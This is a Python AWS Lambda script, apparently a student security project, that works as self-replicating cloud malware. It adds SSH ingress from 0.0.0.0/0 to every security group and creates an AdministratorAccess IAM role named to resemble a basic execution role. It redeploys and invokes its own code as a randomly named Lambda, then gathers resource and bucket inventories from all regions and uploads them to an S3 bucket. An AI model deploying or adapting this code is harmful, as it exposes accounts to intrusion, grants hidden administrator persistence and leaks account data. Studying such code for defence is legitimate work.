# Author: Shaily Gupta
# Purpose: BCIT COMP8045
# Student ID: A00952989
# Query AWS resources in all regions
# Add all the resource into a dictionary and upload it to a S3 bucket
# If there are any EC2 instances, create a new SG to allow SSH access from the world and add it to the instances

import json
import boto3
import io
from io import BytesIO
import zipfile
import string
import random
import time
from botocore.exceptions import ClientError
import os

letters = string.ascii_letters

def lambda_handler(event, context):

    lambda_client = boto3.client('lambda')
    iam_client = boto3.client('iam')
    ec2_client = boto3.client('ec2')
    s3_client = boto3.client('s3')

    iam_role_name = "AWSLambdaBasicExecutionRule" + ''.join(random.choice(letters) for i in range(1))
    lambdaFunctionName = "default_function_" + ''.join(random.choice(letters) for i in range(3))
    regions = [region['RegionName'] for region in ec2_client.describe_regions()['Regions']]
    
    # print(get_security_groups(ec2_client))
    update_security_groups(get_security_groups(ec2_client))
    # Create an IAM role for the new function
    lambdaIAMRole = create_iam_role_for_lambda(iam_client, iam_role_name = iam_role_name)
    deploymentPackage = create_deployment_package("main.py", "main.py")
    time.sleep(11) # Wait for the IAM role to be created
    replicatedFunction = create_function(
        lambda_client,
        function_name = lambdaFunctionName,
        handler_name = "main.lambda_handler",
        deployment_package = deploymentPackage,
        iam_role = lambdaIAMRole
        )
    time.sleep(6)
    invoke_function(lambda_client,lambdaFunctionName)
    store_data(s3_client, bucketName = "bcit-8045-testing-bucket", gatheredData = get_all_resources(s3_client, regions))
    

def store_data(s3_client, bucketName, gatheredData):
    """
    Stores the scanned data into a public S3 bucket

    :param s3_client: Boto3 S3 client
    :param bucketName: Bucket to store the data in
    :param gatheredData: Dictionary of data gathered after an AWS scan
    """
    os.chdir('/tmp') # Lambda allows us temp data storage in this path
    if not os.path.exists(os.path.join('mydir')):
        os.makedirs('mydir')
    filename = 'data.json'
    save_path = os.path.join(os.getcwd(), 'mydir', filename)

    with open(save_path, 'w') as json_file:
        json.dump(gatheredData, json_file, indent=4, default=str)
    storeData = s3_client.upload_file(save_path, bucketName, "data")


def create_deployment_package(source_file, destination_file):
    """
    Creates a Lambda deployment package in .zip format in an in-memory buffer. This
    buffer can be passed directly to Lambda when creating the function.

    :param source_file: The name of the file that contains the Lambda handler
                        function.
    :param destination_file: The name to give the file when it's deployed to Lambda.
    :return: The deployment package.
    """
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, 'w') as zipped:
        zipped.write(source_file, destination_file)
    buffer.seek(0)
    return buffer.read()

def create_iam_role_for_lambda(client, iam_role_name):
    """
    Creates an IAM role that grants the Lambda function basic permissions.

    :param client: Boto3 client
    :param iam_role_name: The name of the role to create.
    :return: The role.
    """
    lambda_assume_role_policy = {
        'Version': '2012-10-17',
        'Statement': [
            {
                'Effect': 'Allow',
                'Principal': {
                    'Service': 'lambda.amazonaws.com'
                },
                'Action': 'sts:AssumeRole'
            }
        ]
    }
    admin_policy_arn = 'arn:aws:iam::aws:policy/AdministratorAccess'

    try:
        role = client.create_role(
            RoleName=iam_role_name,
            AssumeRolePolicyDocument=json.dumps(lambda_assume_role_policy))
        print("Created role ")
        client.attach_role_policy(
            RoleName=iam_role_name,
            PolicyArn=admin_policy_arn)
        print("Attached basic execution policy to role ")
    except ClientError as error:
        pass
    
    return role

def create_function(client, function_name, handler_name, deployment_package, iam_role):
    """
    Deploys a Lambda function.

    :param client: Boto3 client
    :param function_name: The name of the Lambda function.
    :param handler_name: The fully qualified name of the handler function. This
                            must include the file name and the function name.
    :param iam_role: The IAM role to use for the function.
    :param deployment_package: The deployment package that contains the function
                                code in .zip format.
    :return: The Amazon Resource Name (ARN) of the newly created function.
    """
    try:
        print(iam_role['Role']['Arn'])
        response = client.create_function(
            FunctionName=function_name,
            Runtime='python3.9',
            # Role="arn:aws:iam::599360352143:role/default_testingGuTVZYQrDF",
            Role=iam_role['Role']['Arn'],
            Handler=handler_name,
            Code={'ZipFile': deployment_package},
            Timeout=60,
            Publish=True)
        function_arn = response['FunctionArn']
        # waiter = lambda_client.get_waiter('function_active_v2')
        # waiter.wait(FunctionName=function_name)
        print("Created function " + function_name + " with ARN: " + response['FunctionArn'])
    except ClientError:
        print("Couldn't create function " + function_name)
        raise
    else:
        return function_arn

def invoke_function(client, function_name):
    """
    Invokes a Lambda function.

    :param function_name: The name of the function to invoke.
    :param function_params: The parameters of the function as a dict. This dict
                            is serialized to JSON before it is sent to Lambda.
    :param get_log: When true, the last 4 KB of the execution log are included in
                    the response.
    :return: The response from the function invocation.
    """
    try:
        response = client.invoke(FunctionName=function_name)
        print(function_name + " invoked")
    except ClientError:
        pass
    return response

def get_all_resources(s3_client, regions):
    """
    Gets all the active resources in all the AWS regions.

    :param client: Boto3 client
    :param regions: List of available regions in AWS
    :return: The gathered data from the AWS account
    """
    gatheredData = []
    for region in regions:
        try:
            client = boto3.client('resourcegroupstaggingapi', region_name=region)
            resources = [x.get('ResourceARN') for x in client.get_resources().get('ResourceTagMappingList')]
            data = {
                "region": region,
                "resources": resources
            }
            gatheredData.append(data)
        except ClientError as e:
            print(f'Could not connect to region with error: {e}')
            pass

    s3Buckets = s3_client.list_buckets()['Buckets']
    gatheredData.append({"S3": s3Buckets})
    return gatheredData

def get_security_groups(client):
    """
    Gets all the active resources in all the AWS regions.

    :param client: Boto3 client
    :return: The security groups in a region
    """    
    groups = [{"name": f_group['GroupName'], "id": f_group['GroupId']}
           for f_group in client.describe_security_groups()['SecurityGroups']]
    
    return groups

def update_security_groups(groups):
    """
    Gets all the active resources in all the AWS regions.

    :param groups: Security groups to update
    """
    ec2 = boto3.resource('ec2')
    security_group = ec2.SecurityGroup('id')

    for sgId in groups:
        try:
            sgName = sgId['name']
            print(sgName)
            security_group.authorize_ingress(
                GroupId=sgId['id'],
                IpPermissions=[ 
                    {
                        'IpProtocol': 'tcp',
                        'FromPort': 22,
                        'ToPort': 22,
                        'IpRanges':[
                            {
                                'CidrIp': '0.0.0.0/0', 
                                'Description' : 'default'
                                
                            }
                        ]
                        
                    }
                ]
            )
        except ClientError as e:
            print(f'Could not update security group: {e}')
            pass
    